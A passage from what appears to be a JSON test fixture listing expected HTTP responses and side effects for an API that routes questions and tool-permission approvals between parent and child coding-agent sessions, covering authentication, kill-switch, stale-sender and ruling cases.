    {"status": 200, "body": "{\"ok\":true}", "effects": {"row": {"state": "answered", "answeredBy": "project-a-calm-mesa", "answer": "Red"}, "doorIns": ["answeredLate(\"project-a-quiet-basin\",1,\"project-a-calm-mesa\")"], "keys": ["project-a-quiet-basin 1"], "feed": ["question answered"], "pushes": []}},
  "POST /api/asks/:id/release | 1 | no coordination store":
    {"status": 501, "body": "{\"ok\":false,\"error\":\"not-configured\"}", "effects": {}},
  "POST /api/asks/:id/release | 2 | no box token":
    {"status": 401, "body": "{\"ok\":false,\"error\":\"unauthenticated\",\"detail\":\"no box token presented — POST /api/asks/:id/release grants no legacy tolerance\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/release | pair 2+3 | no box token and a bad body":
    {"status": 401, "body": "{\"ok\":false,\"error\":\"unauthenticated\",\"detail\":\"no box token presented — POST /api/asks/:id/release grants no legacy tolerance\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/release | 3 | a bad body":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"fromId/fromUuid strings\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/release | 4 | an unknown sender":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"unknown-sender\",\"detail\":\"no registry row for project-a-nobody-here\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/release | 4 | a stale uuid":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"stale-uuid\",\"detail\":\"fromUuid does not match the registry — stale sender; re-read your own .uuid\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/release | pair 4+5 | a stale uuid on a non-canonical id":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"stale-uuid\",\"detail\":\"fromUuid does not match the registry — stale sender; re-read your own .uuid\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/release | 5 | a non-canonical id":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/release | 6 | the store refuses the read":
    {"status": 503, "body": "{\"ok\":false,\"error\":\"ask-unreadable\",\"detail\":\"fixture: the asks table is unreadable\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/release | 7 | no such ask":
    {"status": 404, "body": "{\"ok\":false,\"error\":\"unknown-ask\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/release | 8 | not the stored parent":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"not-parent\",\"detail\":\"only this child's derived parent may decline its question\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/release | 9 | not held (already answered)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"not-held\"}", "effects": {"row": {"state": "answered", "answeredBy": "operator", "answer": "Red"}, "doorIns": [], "keys": [], "feed": [], "pushes": []}},
  "POST /api/asks/:id/release | success | declined, and the door-in fires (nothing held in memory: no push)":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"row": {"state": "declined", "answeredBy": null, "answer": null}, "doorIns": ["releaseHeldAsk(\"project-a-quiet-basin\")"], "keys": [], "feed": [], "pushes": []}},
  "POST /api/approvals | 1 notConfigured | no coordination store":
    {"status": 501, "body": "{\"ok\":false,\"error\":\"not-configured\"}", "effects": {}},
  "POST /api/approvals | 2 401 | no box token":
    {"status": 401, "body": "{\"ok\":false,\"error\":\"unauthenticated\",\"detail\":\"no box token presented — POST /api/approvals grants no legacy tolerance\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | pair 2+3 | no box token and a bad body":
    {"status": 401, "body": "{\"ok\":false,\"error\":\"unauthenticated\",\"detail\":\"no box token presented — POST /api/approvals grants no legacy tolerance\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 3 bad-request | no nonce":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"v 1, sessionId, sessionUuid, digest (64 hex), nonce (32 hex), and exactly one of canonical (a string) or truncated (true)\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 3 bad-request | both canonical and truncated":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"v 1, sessionId, sessionUuid, digest (64 hex), nonce (32 hex), and exactly one of canonical (a string) or truncated (true)\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | pair 3+4 | a bad body on a killed lane":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"v 1, sessionId, sessionUuid, digest (64 hex), nonce (32 hex), and exactly one of canonical (a string) or truncated (true)\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 4 approvals-disabled | the fleet box marker":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"approvals-disabled\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 4 approvals-disabled | the server box marker":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"approvals-disabled\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 4 approvals-disabled | an unlistable registry fails shut":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"approvals-disabled\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | cross | KILLED AND UNATTRIBUTED: the kill switch is read first":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"approvals-disabled\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 5 attribution | an unknown sender":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"unknown-sender\",\"detail\":\"no registry row for project-a-nobody-here\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 5 attribution | a stale uuid":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"stale-uuid\",\"detail\":\"sessionUuid does not match the registry — stale sender; re-read your own .uuid\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | pair 5+6 | a stale uuid on a single box":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"stale-uuid\",\"detail\":\"sessionUuid does not match the registry — stale sender; re-read your own .uuid\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 6 single-box | role both without the opt-in":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"single-box\",\"detail\":\"this server shares one box with the sessions; place ~/.ccrc/approvals-single-box to opt in\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | pair 6+7 | a single box with no signing key":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"single-box\",\"detail\":\"this server shares one box with the sessions; place ~/.ccrc/approvals-single-box to opt in\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | cross | SIGNER MISSING: valid, attributed, allowed here, no key: internal, nothing minted":
    {"status": 500, "body": "{\"ok\":false,\"error\":\"internal\",\"detail\":\"the approval signing key is not loaded\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | pair 7+8 | no signing key, for a session that is not a child":
    {"status": 500, "body": "{\"ok\":false,\"error\":\"internal\",\"detail\":\"the approval signing key is not loaded\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 8 not-a-child | no child mark":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"not-a-child\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | pair 8+9 | not a child, and no deny file engaged":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"not-a-child\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 9 deny-not-engaged | no deny digest on the child":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"deny-not-engaged\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | pair 9+10 | no deny digest, on an unverified version":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"deny-not-engaged\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 10 version-unverified | 2.1.299":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"version-unverified\",\"detail\":\"this child's live Claude Code version (2.1.299) is not one the rig verified\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | pair 10+11 | an unverified version and a digest that does not match":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"version-unverified\",\"detail\":\"this child's live Claude Code version (2.1.299) is not one the rig verified\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 11 digest-mismatch | the digest does not match, and the journal line":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"digest-mismatch\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": "<now> digest-mismatch project-a-quiet-basin\n"}},
  "POST /api/approvals | pair 11+12 | a digest mismatch while the runs are unreadable":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"digest-mismatch\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": "<now> digest-mismatch project-a-quiet-basin\n"}},
  "POST /api/approvals | 12 run-unreadable | heldFor throws":
    {"status": 503, "body": "{\"ok\":false,\"error\":\"run-unreadable\",\"detail\":\"heldFor: fixture: the runs table is unreadable\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 13 not-a-child | heldFor's verdict (the mark names no run)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"not-a-child\"}", "effects": {"minted": 0, "row": null, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 14 approval-released | truncated":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"approval-released\",\"id\":1,\"releaseReason\":\"truncated\"}", "effects": {"minted": 1, "row": {"state": "released", "answeredBy": null, "releaseReason": "truncated"}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 14 approval-released | unparseable (the input is not an object)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"approval-released\",\"id\":1,\"releaseReason\":\"unparseable\"}", "effects": {"minted": 1, "row": {"state": "released", "answeredBy": null, "releaseReason": "unparseable"}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 14 approval-released | the claimant rule: the parent is not live":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"approval-released\",\"id\":1,\"releaseReason\":\"parent-not-live\"}", "effects": {"minted": 1, "row": {"state": "released", "answeredBy": null, "releaseReason": "parent-not-live"}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 14 approval-released | the claimant rule: no claimant on the run":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"approval-released\",\"id\":1,\"releaseReason\":\"run-unclaimed\"}", "effects": {"minted": 1, "row": {"state": "released", "answeredBy": null, "releaseReason": "run-unclaimed"}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 14 approval-released | forbidden: minted released, never mailed":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"approval-released\",\"id\":1,\"releaseReason\":\"forbidden\"}", "effects": {"minted": 1, "row": {"state": "released", "answeredBy": null, "releaseReason": "forbidden"}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals | 15 201 | minted held for the claimant, mailed":
    {"status": 201, "body": "{\"id\":1,\"waitS\":60}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 1, "journal": null}},
  "POST /api/approvals | 15 201 | a subagent's request (its own window)":
    {"status": 201, "body": "{\"id\":1,\"waitS\":180}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 1, "journal": null}},
  "POST /api/approvals/:id/rule | 1 | no coordination store":
    {"status": 501, "body": "{\"ok\":false,\"error\":\"not-configured\"}", "effects": {}},
  "POST /api/approvals/:id/rule | 2 | no box token":
    {"status": 401, "body": "{\"ok\":false,\"error\":\"unauthenticated\",\"detail\":\"no box token presented — POST /api/approvals/:id/rule grants no legacy tolerance\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | pair 2+3 | no box token and a widening field":
    {"status": 401, "body": "{\"ok\":false,\"error\":\"unauthenticated\",\"detail\":\"no box token presented — POST /api/approvals/:id/rule grants no legacy tolerance\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 3 | a widening field (permanent)":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"a ruling allows once only; permanent is never accepted\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 3 | a widening field (updatedPermissions)":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"a ruling allows once only; updatedPermissions is never accepted\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 3 | a widening field (mode)":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"a ruling allows once only; mode is never accepted\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | pair 3+4 | a widening field on a bad body":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"a ruling allows once only; mode is never accepted\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 4 | a bad body (an empty reason)":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"fromId/fromUuid strings, verdict allow or deny, and a reason of 1 to 1000 characters\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 4 | a bad body (verdict maybe)":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"fromId/fromUuid strings, verdict allow or deny, and a reason of 1 to 1000 characters\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | pair 4+5 | a bad body from a stale uuid":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"fromId/fromUuid strings, verdict allow or deny, and a reason of 1 to 1000 characters\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 5 | an unknown sender":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"unknown-sender\",\"detail\":\"no registry row for project-a-nobody-here\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 5 | a stale uuid":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"stale-uuid\",\"detail\":\"fromUuid does not match the registry — stale sender; re-read your own .uuid\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | pair 5+6 | a stale uuid on a non-canonical id":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"stale-uuid\",\"detail\":\"fromUuid does not match the registry — stale sender; re-read your own .uuid\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 6 | a non-canonical id":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 7 | the store refuses the read":
    {"status": 503, "body": "{\"ok\":false,\"error\":\"approval-unreadable\",\"detail\":\"fixture: the approvals table is unreadable\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 8 | no such approval":
    {"status": 404, "body": "{\"ok\":false,\"error\":\"unknown-approval\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | pair 8+9 | no such approval on a killed lane":
    {"status": 404, "body": "{\"ok\":false,\"error\":\"unknown-approval\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 9 | the kill switch":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"approvals-disabled\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 10 | single-box (the opt-in withdrawn after the mint)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"single-box\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | pair 10+11 | single-box, ruled by another session":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"single-box\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 11 | not the stored parent":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"not-parent\",\"detail\":\"only the claimant this prompt was held for may rule on it\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 12 | a row minted released (forbidden)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"approval-released\",\"releaseReason\":\"forbidden\"}", "effects": {"minted": 1, "row": {"state": "released", "answeredBy": null, "releaseReason": "forbidden"}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 13 | declined (handed over first)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"declined\"}", "effects": {"minted": 1, "row": {"state": "declined", "answeredBy": "project-a-calm-mesa", "releaseReason": null}, "doorIns": ["releaseHeldApproval(\"project-a-quiet-basin\")"], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 14 | already ruled":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"already-ruled\"}", "effects": {"minted": 1, "row": {"state": "denied", "answeredBy": "project-a-calm-mesa", "releaseReason": null}, "doorIns": ["approvalRuled(\"project-a-quiet-basin\",\"\",\"project-a-calm-mesa\",\"deny\")"], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 15 | hook-gone (the row is stale)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"hook-gone\"}", "effects": {"minted": 1, "row": {"state": "stale", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 16 | hook-gone (the window has passed)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"hook-gone\",\"detail\":\"the window has passed: the child's hook has returned and the operator has the prompt\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 17 | not a child any more (the mark removed)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"not-a-child\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 18 | run-unreadable (heldFor throws)":
    {"status": 503, "body": "{\"ok\":false,\"error\":\"run-unreadable\",\"detail\":\"heldFor: fixture: the runs table is unreadable\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 19 | parent-changed (the run's claimant moved)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"parent-changed\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 20 | guard-escalate (an allow with no input held: a restarted server)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"guard-escalate\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 20 | guard-escalate (an escalate-class row)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"guard-escalate\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | 21 | internal (no signing key; a deny skips the guard)":
    {"status": 500, "body": "{\"ok\":false,\"error\":\"internal\",\"detail\":\"the approval signing key is not loaded\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | success | allow: signed, stored, recorded, door-in":
    {"status": 200, "body": "{\"ok\":true,\"state\":\"allowed\"}", "effects": {"minted": 1, "row": {"state": "allowed", "answeredBy": "project-a-calm-mesa", "releaseReason": null}, "doorIns": ["approvalRuled(\"project-a-quiet-basin\",\"\",\"project-a-calm-mesa\",\"allow\")"], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | success | deny":
    {"status": 200, "body": "{\"ok\":true,\"state\":\"denied\"}", "effects": {"minted": 1, "row": {"state": "denied", "answeredBy": "project-a-calm-mesa", "releaseReason": null}, "doorIns": ["approvalRuled(\"project-a-quiet-basin\",\"\",\"project-a-calm-mesa\",\"deny\")"], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/rule | success | a lapsed (released) row inside its window":
    {"status": 200, "body": "{\"ok\":true,\"state\":\"denied\"}", "effects": {"minted": 1, "row": {"state": "denied", "answeredBy": "project-a-calm-mesa", "releaseReason": null}, "doorIns": ["approvalRuled(\"project-a-quiet-basin\",\"\",\"project-a-calm-mesa\",\"deny\")"], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | 1 | no coordination store":
    {"status": 501, "body": "{\"ok\":false,\"error\":\"not-configured\"}", "effects": {}},
  "POST /api/approvals/:id/release | 2 | no box token":
    {"status": 401, "body": "{\"ok\":false,\"error\":\"unauthenticated\",\"detail\":\"no box token presented — POST /api/approvals/:id/release grants no legacy tolerance\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | pair 2+3 | no box token and a bad body":
    {"status": 401, "body": "{\"ok\":false,\"error\":\"unauthenticated\",\"detail\":\"no box token presented — POST /api/approvals/:id/release grants no legacy tolerance\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | 3 | a bad body":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\",\"detail\":\"fromId/fromUuid strings\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | 4 | an unknown sender":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"unknown-sender\",\"detail\":\"no registry row for project-a-nobody-here\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | 4 | a stale uuid":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"stale-uuid\",\"detail\":\"fromUuid does not match the registry — stale sender; re-read your own .uuid\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | pair 4+5 | a stale uuid on a non-canonical id":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"stale-uuid\",\"detail\":\"fromUuid does not match the registry — stale sender; re-read your own .uuid\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | 5 | a non-canonical id":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | 6 | the store refuses the read":
    {"status": 503, "body": "{\"ok\":false,\"error\":\"approval-unreadable\",\"detail\":\"fixture: the approvals table is unreadable\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | 7 | no such approval":
    {"status": 404, "body": "{\"ok\":false,\"error\":\"unknown-approval\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | 8 | not the stored parent":
    {"status": 403, "body": "{\"ok\":false,\"error\":\"not-parent\",\"detail\":\"only the claimant this prompt was held for may hand it over\"}", "effects": {"minted": 1, "row": {"state": "held", "answeredBy": null, "releaseReason": null}, "doorIns": [], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | 9 | not held (already ruled)":
    {"status": 409, "body": "{\"ok\":false,\"error\":\"not-held\"}", "effects": {"minted": 1, "row": {"state": "denied", "answeredBy": "project-a-calm-mesa", "releaseReason": null}, "doorIns": ["approvalRuled(\"project-a-quiet-basin\",\"\",\"project-a-calm-mesa\",\"deny\")"], "mailToParent": 0, "journal": null}},
  "POST /api/approvals/:id/release | success | declined, and the door-in fires":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"minted": 1, "row": {"state": "declined", "answeredBy": "project-a-calm-mesa", "releaseReason": null}, "doorIns": ["releaseHeldApproval(\"project-a-quiet-basin\")"], "mailToParent": 0, "journal": null}},
  "POST /api/sessions/:id/ask | 1 | an unknown session":
    {"status": 404, "body": "{\"ok\":false,\"error\":\"unknown-session\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "keys": [], "feed": []}},
  "POST /api/sessions/:id/ask | pair 1+2 | an unknown session and a bad body":
    {"status": 404, "body": "{\"ok\":false,\"error\":\"unknown-session\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "keys": [], "feed": []}},
  "POST /api/sessions/:id/ask | 2 | no askKey":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "keys": [], "feed": []}},
  "POST /api/sessions/:id/ask | 2 | optionIndexes not numbers":
    {"status": 400, "body": "{\"ok\":false,\"error\":\"bad-request\"}", "effects": {"row": {"state": "held", "answeredBy": null, "answer": null}, "keys": [], "feed": []}},
  "POST /api/sessions/:id/ask | no coord | the press goes through plain":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"keys": ["project-a-quiet-basin 2"]}},
  "POST /api/sessions/:id/ask | nothing held | the press goes through, nothing recorded":
    {"status": 200, "body": "{\"ok\":true}", "effects": {"row": null, "keys": ["project-a-quiet-basin 2"], "feed": []}},
  "POST /api/sessions/:id/ask | held and taken | answered by the operator, recorded":
